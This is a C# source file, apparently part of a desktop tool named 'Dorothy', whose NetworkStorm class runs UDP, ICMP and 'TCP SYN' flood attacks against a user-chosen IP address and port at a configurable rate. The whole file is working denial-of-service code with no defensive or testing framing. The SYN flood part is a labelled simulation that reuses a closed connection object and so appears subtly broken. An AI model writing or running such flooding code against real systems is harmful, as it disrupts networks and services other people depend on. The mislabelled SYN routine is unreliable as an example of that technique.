using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Controls;
using NLog;

namespace Dorothy.Models
{
    public class NetworkStorm
    {
        private string _sourceIp = "192.168.0.1"; // Default Source IP
        private byte[] _sourceMac = new byte[] { 0x00, 0x0C, 0x29, 0x3E, 0x1C, 0x2B }; // Default MAC
        private bool _isAttackRunning = false;
        private readonly TextBox _logArea;
        private CancellationTokenSource _cancellationSource;

        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();

        public bool IsAttackRunning => _isAttackRunning;

        public NetworkStorm(TextBox logArea)
        {
            _logArea = logArea ?? throw new ArgumentNullException(nameof(logArea));
        }

        public async Task StartAttackAsync(string attackType, string targetIp, int targetPort, long bytesPerSecond)
        {
            if (_isAttackRunning)
            {
                Log("Attack already in progress.");
                return;
            }

            _isAttackRunning = true;
            _cancellationSource = new CancellationTokenSource();

            try
            {
                switch (attackType)
                {
                    case "UDP Flood":
                        await StartUdpFloodAsync(targetIp, targetPort, bytesPerSecond, _cancellationSource.Token);
                        break;
                    case "ICMP Flood":
                        await StartIcmpFloodAsync(targetIp, bytesPerSecond, _cancellationSource.Token);
                        break;
                    case "TCP SYN Flood":
                        await StartTcpSynFloodAsync(targetIp, targetPort, bytesPerSecond, _cancellationSource.Token);
                        break;
                    default:
                        Log($"Unknown attack type: {attackType}");
                        break;
                }
            }
            catch (OperationCanceledException)
            {
                Log("Attack canceled by user.");
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error during attack.");
                Log($"Error during attack: {ex.Message}");
            }
            finally
            {
                _isAttackRunning = false;
            }
        }

        public void StopAttack()
        {
            if (!_isAttackRunning)
            {
                Log("No attack is running.");
                return;
            }

            _cancellationSource.Cancel();
            Log("Stopping attack...");
        }

        private async Task StartUdpFloodAsync(string targetIp, int targetPort, long bytesPerSecond, CancellationToken token)
        {
            Log("Starting UDP Flood attack...");
            using (UdpClient udpClient = new UdpClient())
            {
                udpClient.Connect(targetIp, targetPort);
                byte[] data = Encoding.ASCII.GetBytes(new string('A', 1024)); // 1 KB payload
                int packetsPerSecond = (int)(bytesPerSecond / data.Length);
                if (packetsPerSecond <= 0) packetsPerSecond = 1;
                double delay = 1000.0 / packetsPerSecond;

                Log($"UDP Flood: Sending {packetsPerSecond} packets per second.");

                while (!token.IsCancellationRequested)
                {
                    await udpClient.SendAsync(data, data.Length);
                    Log($"Sent UDP packet to {targetIp}:{targetPort}");
                    await Task.Delay(TimeSpan.FromMilliseconds(delay), token);
                }
            }
            Log("UDP Flood attack stopped.");
        }

        private async Task StartIcmpFloodAsync(string targetIp, long bytesPerSecond, CancellationToken token)
        {
            Log("Starting ICMP Flood attack...");
            using (Ping ping = new Ping())
            {
                int pingsPerSecond = (int)(bytesPerSecond / 32); // Approx 32 bytes per ping
                if (pingsPerSecond <= 0) pingsPerSecond = 1;
                double delay = 1000.0 / pingsPerSecond;

                Log($"ICMP Flood: Sending {pingsPerSecond} pings per second.");

                while (!token.IsCancellationRequested)
                {
                    try
                    {
                        PingReply reply = await ping.SendPingAsync(targetIp, 1000);
                        if (reply.Status == IPStatus.Success)
                        {
                            Log($"Ping successful: Time={reply.RoundtripTime}ms");
                        }
                        else
                        {
                            Log($"Ping failed: {reply.Status}");
                        }
                    }
                    catch (Exception ex)
                    {
                        Log($"Ping error: {ex.Message}");
                    }

                    await Task.Delay(TimeSpan.FromMilliseconds(delay), token);
                }
            }
            Log("ICMP Flood attack stopped.");
        }

        private async Task StartTcpSynFloodAsync(string targetIp, int targetPort, long bytesPerSecond, CancellationToken token)
        {
            Log("Starting TCP SYN Flood attack...");
            // Note: Implementing a real TCP SYN Flood requires raw sockets and administrative privileges.
            // This implementation is a simplified simulation.

            using (TcpClient tcpClient = new TcpClient())
            {
                int connectionsPerSecond = (int)(bytesPerSecond / 50); // Approx 50 bytes per connection
                if (connectionsPerSecond <= 0) connectionsPerSecond = 1;
                double delay = 1000.0 / connectionsPerSecond;

                Log($"TCP SYN Flood: Opening {connectionsPerSecond} connections per second.");

                while (!token.IsCancellationRequested)
                {
                    try
                    {
                        await tcpClient.ConnectAsync(targetIp, targetPort);
                        Log($"TCP connection to {targetIp}:{targetPort} established.");
                        tcpClient.Close();
                    }
                    catch (Exception ex)
                    {
                        Log($"TCP connection error: {ex.Message}");
                    }

                    await Task.Delay(TimeSpan.FromMilliseconds(delay), token);
                }
            }
            Log("TCP SYN Flood attack stopped.");
        }

        private void Log(string message)
        {
            try
            {
                var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                var logMessage = $"[{timestamp}] {message}\n";

                // Ensure thread-safe access to the UI thread
                if (_logArea.Dispatcher.CheckAccess())
                {
                    _logArea.AppendText(logMessage);
                    _logArea.ScrollToEnd();
                }
                else
                {
                    _logArea.Dispatcher.Invoke(() =>
                    {
                        _logArea.AppendText(logMessage);
                        _logArea.ScrollToEnd();
                    });
                }
            }
            catch (Exception ex)
            {
                // Fallback logging in case of failure
                Logger.Error(ex, "Logging failed.");
            }
        }
    }
} 
